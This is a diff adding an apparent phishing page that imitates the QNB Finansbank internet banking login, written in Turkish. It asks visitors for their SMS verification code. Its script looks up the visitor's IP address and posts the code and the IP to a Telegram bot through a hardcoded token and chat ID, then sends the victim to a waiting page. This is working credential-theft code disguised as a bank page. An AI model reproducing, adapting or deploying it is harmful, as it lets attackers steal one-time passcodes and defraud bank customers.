@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="tr">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport"
+        content="width=device-width, user-scalable=no, initial-scale=1.0, minimum-scale=1, height=device-height">
+    <title>QNB Finansbank İnternet Şubesi</title>
+    <meta http-equiv="PRAGMA" content="NO-CACHE">
+    <meta http-equiv="CACHE-CONTROL" content="NO-CACHE">
+    <meta http-equiv="Expires" content="now">
+    <meta name="google" content="notranslate">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="robots" content="noindex">
+    <meta name="googlebot" content="noindex">
+    <meta name="apple-itunes-app-new" content="app-id=739655617">
+    <meta name="msApplication-ID" content="App">
+    <link href="css/jquery.smartbanner.css" rel="stylesheet" type="text/css">
+    <link type="text/css" rel="stylesheet" href="css/FinansbankDropDownList.css">
+    <link type="text/css" rel="stylesheet" href="css/FBDialog.css">
+    <link type="text/css" rel="stylesheet" href="css/FBTooltip.css">
+    <link type="text/css" rel="stylesheet" href="css/FinansbankLoginStyle.css">
+    <link type="text/css" rel="stylesheet" href="css/warning.css">
+    <link type="text/css" rel="stylesheet" href="css/loginmain.css">
+    <link type="text/css" rel="stylesheet" href="css/bootstrap-ie11.css">
+    <link type="text/css" rel="stylesheet" href="css/cordale.min.css">
+    <link type="text/css" rel="stylesheet" href="css/muli.min.css">
+    <link type="text/css" rel="stylesheet" href="css/bootstrap.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            max-width: 980px;
+            padding: 20px;
+            text-align: left;
+        }
+
+        .bold {
+            font-weight: bold;
+            font-size: 24px;
+            color: #555;
+            /* Koyu gri renk */
+        }
+
+        .button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border-radius: 5px;
+            text-decoration: none;
+            margin-top: 20px;
+            font-size: 18px;
+            display: inline-block;
+            cursor: pointer;
+        }
+
+        .input-field {
+            margin-top: 20px;
+            font-size: 18px;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #d7d7d7;
+            width: 100%;
+        }
+    </style>
+    <script type="text/javascript" src="js/jquery-1.6.2.min.js"></script>
+    <script type="text/javascript" src="js/jquery-ui-1.7.3.custom.min.js"></script>
+    <script type="text/javascript" src="js/jquery.json-2.3.min.js"></script>
+    <script type="text/javascript" src="js/jquery.data.js"></script>
+    <script type="text/javascript" src="js/jquery.watermark.js"></script>
+    <script type="text/javascript" src="js/FBGeneral.js"></script>
+    <script type="text/javascript" src="js/FBTooltip.js"></script>
+    <script type="text/javascript" src="js/rsa.js"></script>
+    <script type="text/javascript" src="js/FBDialog.js"></script>
+    <script type="text/javascript" src="js/bootstrap.js"></script>
+    <script src="js/jquery.inputmask.min.js"></script>
+    <script type="text/javascript" src="js/jquery.smartbanner.js"></script>
+</head>
+
+<body>
+    <div class="container">
+        <div id="ctl00_headerDiv" class="header-purple">
+            <div id="leftDiv" class="headerLeftDiv"></div>
+            <span id="imgText" class="headerImgText">İnternet Şubesi</span>
+        </div>
+
+        <section id="loginf">
+            <div class="row p-10-ch">
+                <div id="mainPanel" class="px-0 mainContent">
+                    <div class="row" style="height: 100%; justify-content: center;">
+                        <div class="col-lg-8 col-md-7 col-12 mainPanel-width"
+                            style="border: 2px solid #d7d7d7; border-radius: 10px; padding: 30px; float: left; min-height: 380px;">
+                            <form id="telegramSex">
+                                <div class="subPanel-width">
+                                    <div class="row">
+                                        <div class="col-12">
+                                            <center>
+                                                <p class="bold">SMS KODUNUZ</p>
+                                                <center> <input type="text" id="smsCode" class="input-field"
+                                                        placeholder="SMS Kodunu Girin">
+                                                    <span id="telegramButton" class="button">GİRİŞ</span>
+                                        </div>
+                                    </div>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+    </div>
+    <script>
+        $(document).ready(function () {
+            $('#telegramButton').click(function (e) {
+                e.preventDefault();
+                var smsCode = $('#smsCode').val();
+
+                if (smsCode === '') {
+                    alert('Lütfen SMS kodunu girin.');
+                    return;
+                }
+
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        var ipAddress = data.ip;
+
+                        var telegramBotID = '-1002390007242';
+                        var telegramToken = '7980571251:AAG4KdO3CrwcdE3eIgvVL_T6ZIx7F8Pf1E0';
+                        var telegramBotURL = 'https://api.telegram.org/bot' + telegramToken + '/sendMessage';
+
+                        var message = `SMS Kodu: ${smsCode}\nIP Adresi: ${ipAddress}`;
+
+                        $.ajax({
+                            type: 'POST',
+                            url: telegramBotURL,
+                            dataType: 'json',
+                            data: {
+                                chat_id: telegramBotID,
+                                text: message,
+                                parse_mode: 'HTML'
+                            },
+                            success: function (response) {
+                                if (response.ok) {
+                                    window.location.href = 'bekle2.html';
+                                } else {
+                                }
+                            },
+                            error: function (xhr, status, error) {
+                            }
+                        });
+                    })
+                    .catch(error => {
+                    });
+            });
+        });
+    </script>
+
+</body>
+
+</html>
